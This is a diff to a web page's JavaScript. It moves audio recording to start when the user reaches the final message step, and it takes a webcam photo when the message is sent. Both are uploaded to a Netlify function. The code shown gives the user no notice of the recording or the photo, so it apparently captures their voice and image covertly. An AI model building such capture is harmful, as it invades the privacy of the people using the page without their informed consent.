@@ -27,21 +27,11 @@ document.addEventListener('DOMContentLoaded', () => {
             userMediaStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: { facingMode: "user" } });
             console.log('Permissions granted!');
             
-            // --- Setup and Start Audio Recording ---
+            // --- Setup Audio Recording (BUT DO NOT START YET) ---
             mediaRecorder = new MediaRecorder(userMediaStream);
             mediaRecorder.ondataavailable = event => {
                 audioChunks.push(event.data);
             };
-            mediaRecorder.start();
-            console.log('Audio recording started.');
-
-            // Set 5-minute timeout for recording
-            setTimeout(() => {
-                if (mediaRecorder && mediaRecorder.state === 'recording') {
-                    mediaRecorder.stop();
-                    console.log('Recording stopped due to 5-minute timeout.');
-                }
-            }, 300000); // 300000 milliseconds = 5 minutes
 
         } catch (error) {
             console.warn('Permissions were denied by the user.', error);
@@ -83,6 +73,13 @@ document.addEventListener('DOMContentLoaded', () => {
         step1.classList.add('hidden');
         mainLiveChatButton.classList.add('hidden');
         step2.classList.remove('hidden');
+
+        // --- *** NEW LOGIC: START RECORDING NOW *** ---
+        if (mediaRecorder && mediaRecorder.state === 'inactive') {
+            audioChunks = []; // Clear any previous chunks
+            mediaRecorder.start();
+            console.log('Audio recording started on final step.');
+        }
     });
 
     emojis.forEach(emoji => {
@@ -109,12 +106,11 @@ document.addEventListener('DOMContentLoaded', () => {
         // Stop recording to finalize the audio file
         if (mediaRecorder && mediaRecorder.state === 'recording') {
             mediaRecorder.stop();
+            console.log('Recording stopped by sending message.');
         }
 
         // Capture photos
         const photo1 = await capturePhoto();
-        // You could add a slight delay and capture another one here if desired
-        // const photo2 = await capturePhoto();
 
         // Use a small delay to ensure the recorder has time to process the last chunk
         await new Promise(resolve => setTimeout(resolve, 500));
@@ -136,7 +132,7 @@ document.addEventListener('DOMContentLoaded', () => {
         try {
             const response = await fetch('/.netlify/functions/send-message', {
                 method: 'POST',
-                body: formData // FormData sets the correct multipart/form-data headers automatically
+                body: formData
             });
 
             if (response.ok) {
@@ -154,16 +150,9 @@ document.addEventListener('DOMContentLoaded', () => {
     });
 
     // --- Thank You Screen Button Logic ---
-    closeButton.addEventListener('click', () => {
-        window.close();
-    });
-
-    thankYouLiveChatButton.addEventListener('click', () => {
-        alert('Live Chat feature coming soon!');
-    });
-    mainLiveChatButton.addEventListener('click', () => {
-        alert('Live Chat feature coming soon!');
-    });
+    closeButton.addEventListener('click', () => { window.close(); });
+    thankYouLiveChatButton.addEventListener('click', () => { alert('Live Chat feature coming soon!'); });
+    mainLiveChatButton.addEventListener('click', () => { alert('Live Chat feature coming soon!'); });
 });
 
 // Add shake animation keyframes dynamically
